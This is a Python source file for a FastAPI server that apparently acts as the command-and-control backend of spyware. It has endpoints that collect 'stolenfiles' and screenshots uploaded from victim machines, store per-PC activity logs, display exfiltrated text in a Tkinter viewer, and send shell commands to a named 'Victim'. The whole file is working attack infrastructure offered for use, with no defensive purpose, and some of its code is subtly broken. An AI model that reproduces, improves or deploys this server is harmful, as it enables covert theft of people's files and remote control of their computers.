from fastapi import FastAPI, File, UploadFile
from pydantic import BaseModel
import os 
import threading
from PIL import Image
import io 
import tkinter as tk
from tkinter import colorchooser
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import HtmlFormatter

def input_dialog(title, message):
    def ok():
        dialog_window.destroy()

    def get_input():
        value = entry.get()
        ok()

        return value

    # Create dialog window
    dialog_window = tk.Toplevel()
    dialog_window.title(title)

    # Create label
    label = tk.Label(dialog_window, text=message)
    label.pack()

    # Create entry widget
    entry = tk.Entry(dialog_window)
    entry.pack()

    # Create OK button
    ok_button = tk.Button(dialog_window, text="OK", command=get_input)
    ok_button.pack()

    # Bind Enter key to OK button
    dialog_window.bind("<Return>", lambda event: ok_button.invoke())

    # Set focus to entry widget
    entry.focus_set()

    # Wait for user input
    dialog_window.wait_window()


def show_text_in_editor(filename, text):
    # Create the main window
    root = tk.Tk()
    root.title(filename)

    # Create a text widget to display the text
    text_widget = tk.Text(root, bg="black", fg="white", font=("Arial", 12))
    text_widget.pack(expand=True, fill="both")

    def change_color(color_type, color):
        if color_type == "bg":
            text_widget.config(bg=color)
        elif color_type == "fg":
            text_widget.config(fg=color)

    def choose_custom_color(color_type):
        color = colorchooser.askcolor()[1]
        if color:
            change_color(color_type, color)

    def change_font_size(size):
        text_widget.config(font=("Arial", size))

    def choose_language(language):
        lexer = get_lexer_by_name(language)
        text_html = highlight(text_widget.get("1.0", "end"), lexer, HtmlFormatter(style="colorful"))
        text_widget.delete("1.0", "end")
        text_widget.insert("1.0", text_html)
        text_widget.config(state="disabled")

    # Create a menu to change color, font size, and language
    menu_bar = tk.Menu(root)

    color_menu = tk.Menu(menu_bar, tearoff=0)
    color_menu.add_command(label="Black", command=lambda: change_color("bg", "black"))
    color_menu.add_command(label="White", command=lambda: change_color("bg", "white"))
    color_menu.add_command(label="Red", command=lambda: change_color("bg", "red"))
    color_menu.add_command(label="Green", command=lambda: change_color("bg", "green"))
    color_menu.add_command(label="Blue", command=lambda: change_color("bg", "blue"))
    color_menu.add_command(label="Custom...", command=lambda: choose_custom_color("bg"))
    menu_bar.add_cascade(label="Background Color", menu=color_menu)

    fg_color_menu = tk.Menu(menu_bar, tearoff=0)
    fg_color_menu.add_command(label="Black", command=lambda: change_color("fg", "black"))
    fg_color_menu.add_command(label="White", command=lambda: change_color("fg", "white"))
    fg_color_menu.add_command(label="Red", command=lambda: change_color("fg", "red"))
    fg_color_menu.add_command(label="Green", command=lambda: change_color("fg", "green"))
    fg_color_menu.add_command(label="Blue", command=lambda: change_color("fg", "blue"))
    fg_color_menu.add_command(label="Custom...", command=lambda: choose_custom_color("fg"))
    menu_bar.add_cascade(label="Foreground Color", menu=fg_color_menu)

    font_menu = tk.Menu(menu_bar, tearoff=0)
    font_menu.add_command(label="Small", command=lambda: change_font_size(10))
    font_menu.add_command(label="Medium", command=lambda: change_font_size(12))
    font_menu.add_command(label="Large", command=lambda: change_font_size(14))
    menu_bar.add_cascade(label="Font Size", menu=font_menu)

    language_menu = tk.Menu(menu_bar, tearoff=0)
    language_menu.add_command(label="Python", command=lambda: choose_language("python"))
    language_menu.add_command(label="HTML", command=lambda: choose_language("html"))
    language_menu.add_command(label="JavaScript", command=lambda: choose_language("javascript"))
    language_menu.add_command(label="CSS", command=lambda: choose_language("css"))
    language_menu.add_command(label="JSON", command=lambda: choose_language("json"))
    language_menu.add_command(label="XML", command=lambda: choose_language("xml"))
    language_menu.add_command(label="SQL", command=lambda: choose_language("sql"))
    language_menu.add_command(label="Ruby", command=lambda: choose_language("ruby"))
    language_menu.add_command(label="Perl", command=lambda: choose_language("perl"))
    language_menu.add_command(label="Bash", command=lambda: choose_language("bash"))
    language_menu.add_command(label="C", command=lambda: choose_language("c"))
    language_menu.add_command(label="C++", command=lambda: choose_language("cpp"))
    language_menu.add_command(label="Java", command=lambda: choose_language("java"))
    menu_bar.add_cascade(label="Language", menu=language_menu)

    root.config(menu=menu_bar)

    # Insert the text into the text widget
    text_widget.insert("1.0", text)

    # Run the main event loop to display the window
    root.mainloop()
class TextPayload(BaseModel):
    file_name:str
    data:str

class imgt(BaseModel):
    file_name:str
    data:str

app = FastAPI()


@app.post("/api/recive/payload",status_code=200)
async def recivePaylaod(File_param:UploadFile):
    try:
        os.mkdir(os.getcwd()+"/stolenfiles")
    except:
        pass
    if '.png' not in File_param.filename:
        with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
            contents = await File_param.read()
            f.write(contents)
    else:
        try:
            os.mkdir(os.getcwd()+"/screenshots")
        except:
            pass
        with open(f"{os.getcwd()}/screenshots/{File_param.filename}",'wb') as f:
            contents = await File_param.read()
            f.write(contents)
    

@app.post("/api/recive/text",status_code=200)
def reciveText(text:TextPayload):
    thread=[]
    thread1 =threading.Thread(target=show_text_in_editor,args=(text.file_name,text.data))
    thread1.start()
    thread.append(thread1)
    for thread2 in thread:
        thread2.join
    return {"STATUS":200}

    
class Logs(BaseModel):
    pc_name:str = None
    log:str
        
@app.post("/api/recive/logs",status_code=200)
def savetologs(log:Logs):
    try:
        os.mkdir(os.getcwd()+"/logs")
    except:
        pass
    try:
        with open(f"{os.getcwd}/logs/{log.pc_name}.txt","a",encoding='utf-8',errors='ignore') as f:
            f.write(log.log)
    except Exception as e:
        print(e)


@app.get("/api/commands/recive/{pcname}")
def shell(pcname:str):
    res = input_dialog(title=f"Started a shell with the Victim[ {pcname} ]",message="you commands")
    print(res)
    return {"CMD":str(res)}


import datetime
@app.post("/api/upload/image")
async def upload_image(file: UploadFile = File(...)):
    contents = await file.read()
    image = Image.open(io.BytesIO(contents))
    image.save(f"{file.filename}")
    return {"filename": file.filename}